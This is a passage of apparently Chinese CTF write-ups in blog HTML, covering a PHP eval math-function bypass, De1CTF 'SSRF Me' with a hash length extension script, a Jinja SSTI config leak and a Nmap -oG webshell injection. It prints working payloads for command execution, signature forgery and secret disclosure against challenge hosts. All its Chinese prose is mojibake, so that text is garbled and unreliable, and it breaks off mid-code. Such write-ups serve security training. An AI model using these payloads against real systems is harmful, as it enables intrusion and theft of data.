class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>phpåŠ¨æ€å‡½æ•°ç‰¹æ€§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addition</span> (<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>   <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>), <span class="hljs-string">&quot;\n&quot;</span>;<br> &#125;<br> <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;addition&quot;</span>;<br> <span class="hljs-variable">$result</span> (<span class="hljs-number">3</span>,<span class="hljs-number">6</span>);<br><span class="hljs-string">&quot;addition&quot;</span>(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å‡è®¾ åŸå§‹ payload<code> system(ls)</code> =&gt;<code>$GET[a]($GET[b])&amp;a=system&amp;b=ls</code></p><p>ä¸­æ‹¬å·è¢«ban payload <code>$GET[a]($GET[b])&amp;a=system&amp;b=ls</code> =&gt; <code>$GET&#123;a&#125;($GET&#123;b&#125;)</code></p><p>æœ€åpayload</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>&#123;<span class="hljs-built_in">pi</span>&#125;(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/5927#toc-1">https://xz.aliyun.com/t/5927#toc-1</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br> <br>app = Flask(__name__)<br> <br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span>  <span class="hljs-comment">#æ³¨å†Œå‡½æ•°</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            os.mkdir(self.sandbox)<br> <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span><br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):      <span class="hljs-comment">#scanæ‰“å¼€è‡ªå·±æ²™ç›’çš„result.txt</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp   <span class="hljs-comment">#è¾“å‡ºè‡ªå·±çš„å‚æ•°</span><br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br> <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))  <span class="hljs-comment">#action=&#x27;scan&#x27;</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span><br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span><br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">9999</span>)<br></code></pre></td></tr></table></figure><p>è¯´è¯´è‡ªå·±çš„æƒ³æ³•ï¼ŒgetSignçš„åœ°æ–¹ param å¯æ§æˆ‘ä»¬åŠ¿å¿…è¦åœ¨è½½è·çš„åœ°æ–¹åšå‡ºæ”¹å˜ æ‰€ä»¥å¤§æ¦‚èƒ½æƒ³åˆ°ä¼ å‚ flag.txtread</p><div class="code-wrapper"><pre><code class="hljs">ä½†æ˜¯è¿™ä¸ªæ€è·¯ä¸å¤ªå®Œå–„ï¼Œçœ‹äº†çœ‹åˆ«äººçš„wpã€‚æœ‰ä¸€ä¸ªç‚¹æˆ‘è§‰å¾—ä¸é”™ï¼Œåœ¨äºline 31,41çš„ifåˆ¤æ–­è¿™é‡Œå¯¹äºactionçš„åˆ¤æ–­æ˜¯ in è€Œé == ä¹Ÿå¯ä»¥æƒ³åˆ°è¿™é‡Œå¯ä»¥æœ‰å¤šä¸ªactionä¼ å‚ã€‚æ¥ä¸‹æ¥å» /geneSign æå®šæˆ‘ä»¬çš„md5 è¿™æ ·æ‹¼æ¥ä¹‹åå°±æ˜¯ md5(keyflag.txtreadscan)ï¼ŒExecå†…å¯¹äºreadçš„å¤„ç†æ–¹æ³•å°±å¯ä»¥æ‰§è¡Œ</code></pre></div><p>æœ€åæœ‰</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/De1ta?param=flag.txt</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>26a26904-6f92-425f-a018-445997ee6c01.node4.buuoj.cn:81<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>action=readscan;sign=e0da2a0335f2dc4ce71357fdd470fbfb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br></code></pre></td></tr></table></figure><h3 id="å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»"><a href="#å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»" class="headerlink" title="å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»"></a>å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»</h3><p>éœ€è¦çŸ¥é“keyçš„é•¿åº¦</p><p>å…ˆåœ¨/geneSign ä¼ ?param=file.txt å¾—åˆ° f112f06e5871b5f22708f07a3549f3d1</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201161208704.png" alt="image-20220116120756414"></p><p>æœ€åæœ‰è„šæœ¬ è®°å¾—æŠŠ \x æ›¿æ¢ä¸º %</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://26a26904-6f92-425f-a018-445997ee6c01.node4.buuoj.cn:81/De1ta?param=flag.txt&#x27;</span><br><br>cookies = &#123;<br>  <span class="hljs-string">&#x27;sign&#x27;</span>: <span class="hljs-string">&#x27;7c63b1256d62b878e5bb9ffb758006a8&#x27;</span>,<br>  <span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&#x27;</span>,<br>  &#125;<br><br>res = requests.get(url=url, cookies=cookies)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__) <br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span> <br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shrine</span>(<span class="hljs-params">shrine</span>):</span> <br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safe_jinja</span>(<span class="hljs-params">s</span>):</span> <br>    s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <br>    blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<br><span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine)) <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>  app.run(debug = <span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªflagçš„ç¯å¢ƒå˜é‡ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤å¯ä»¥ç›´æ¥é€šè¿‡  {undefined{config}} æŸ¥çœ‹appconfigçš„å†…å®¹</p><p>ä½†æ˜¯è¿™ä¸ªé¢˜ç›®è¿‡æ»¤äº†configï¼Œè¿™ä¸ªpayloadæ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰  <code>url_for</code> å’Œ  <code>get_flashed_messages</code></p><p>å¯ä»¥ä½¿ç”¨</p><p>æœ€ç»ˆpayload</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="xml"></span><br><span class="xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>æ„Ÿè§‰å°±åƒæ˜¯ Online Toolçš„æ ·å­ï¼ŒæŒ‰ç…§é‚£é¢˜çš„æ€è·¯æ‰“ â€˜content â€˜</p><p>å®è·µä¸­å‘ç°phpè¢«è¿‡æ»¤ æ›¿æ¢ä¸º phtml è¿™é¢˜è€ƒå¯Ÿçš„nmap -oNå‚æ•°çš„ä½¿ç”¨</p><p>æ„å»º</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27; &lt;?=`nl /*`;?&gt; -oG 1.phtml &#x27;<br></code></pre></td></tr></table></figure><p>å³å¯</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>???ç¯å¢ƒé—®é¢˜ï¼Ÿæ²¡æå‡ºæ¥    </p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>è®¿é—®flag.php xff 127.0.0.1å¾—flag</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>buuç»å…¸éœ€è¦æ•´ç†ä»£ç åœ¨åšé¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) def getUrl(): url = request.args.get(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span></span>) host = parse.urlparse(<span class="hljs-params">url</span>).hostname if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span> parts = list(<span class="hljs-params">urlsplit(<span class="hljs-params">url</span>)</span>) host = parts[<span class="hljs-number">1</span>] if host == <span 